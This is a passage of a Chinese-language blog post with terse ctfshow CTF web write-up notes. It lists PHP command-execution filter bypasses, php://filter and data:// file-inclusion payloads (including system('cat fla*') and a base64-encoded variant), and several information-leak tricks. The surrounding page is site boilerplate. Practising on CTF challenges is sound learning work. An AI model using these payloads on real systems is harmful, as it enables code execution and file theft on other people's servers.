+<h4 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h4><h4 id="文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）"><a href="#文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）" class="headerlink" title="文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）"></a>文件泄露（kindeditor编辑器漏洞，里面有个插入图片，点插入图片，如果目录下无文件，自动遍历到下一目录，直接可以知道flag路径信息）</h4><h4 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h4><h4 id="网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）"><a href="#网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）" class="headerlink" title="网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）"></a>网站信息泄露（网站上泄露了管理员的qq邮箱，网站后台重置密码）</h4><h4 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h4><h4 id="网站探针（tz-php-flag在phpinfo里）"><a href="#网站探针（tz-php-flag在phpinfo里）" class="headerlink" title="网站探针（tz.php,flag在phpinfo里）"></a>网站探针（tz.php,flag在phpinfo里）</h4><h4 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h4><h4 id="ip信息泄露（ping官网）"><a href="#ip信息泄露（ping官网）" class="headerlink" title="ip信息泄露（ping官网）"></a>ip信息泄露（ping官网）</h4><h4 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h4><h4 id="提示在js里面，unicode解码"><a href="#提示在js里面，unicode解码" class="headerlink" title="提示在js里面，unicode解码"></a>提示在js里面，unicode解码</h4><h4 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h4><h4 id="网站密码泄露（密钥在前端）"><a href="#网站密码泄露（密钥在前端）" class="headerlink" title="网站密码泄露（密钥在前端）"></a>网站密码泄露（密钥在前端）</h4><h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><h4 id="网站数据库文件泄露（-db-db-mdb）"><a href="#网站数据库文件泄露（-db-db-mdb）" class="headerlink" title="网站数据库文件泄露（/db/db.mdb）"></a>网站数据库文件泄露（/db/db.mdb）</h4><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">echo%</span><span class="bash">09`tac%09fl*`;<span class="hljs-comment">#可以</span></span><br>passthru(&#x27;tac%09fl*&#x27;);#不可以<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#%09和%20都表示空格</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#官方是这样解的，牛逼</span></span><br>show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web32-36哇呜呜，真想不到"><a href="#web32-36哇呜呜，真想不到" class="headerlink" title="web32-36哇呜呜，真想不到"></a>web32-36哇呜呜，真想不到</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">直接传参进去，利用POST或GET传参，再去通过php伪协议读取flag<br>payload如下：<br>GET型：?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>POST型：?c=include<span class="hljs-variable">$_POST</span>[a]?&gt;再用post写数据：a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64.encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web37-data-协议，后面可以加php代码"><a href="#web37-data-协议，后面可以加php代码" class="headerlink" title="web37-data://协议，后面可以加php代码"></a>web37-data://协议，后面可以加php代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&#x27;cat fla*&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web38-data-协议，这次我们要使用php的短标签"><a href="#web38-data-协议，这次我们要使用php的短标签" class="headerlink" title="web38-data://协议，这次我们要使用php的短标签"></a>web38-data://协议，这次我们要使用php的短标签</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&#x27;cat fla*&#x27;</span>)<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>还有一种解法</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgc<span class="hljs-number">3</span>lzdGVtKCdjYXQgZmxhZy<span class="hljs-number">5</span>waHAnKTs/Pg==<br></code></pre></td></tr></table></figure>
+
+<h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><h3 id="web90-intval-用小数绕过（4476-2）"><a href="#web90-intval-用小数绕过（4476-2）" class="headerlink" title="web90-intval(用小数绕过（4476.2）)"></a>web90-intval(用小数绕过（4476.2）)</h3><h3 id="CTF萌新"><a href="#CTF萌新" class="headerlink" title="CTF萌新"></a>CTF萌新</h3><p>web1 -奇怪，id=1000不可以，id=’1000’却可以，难道说’1000’是字符串？？？</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctfshow/">ctfshow</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/01/kali%20linux%E5%AE%89%E8%A3%85docker/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">kali Linux安装docker教程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/">
+                        <span class="hidden-mobile">kali修复引导方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        赣ICP证2021009463号
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=2021009463"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+            
+            <span>赣ICP备2021009463号</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
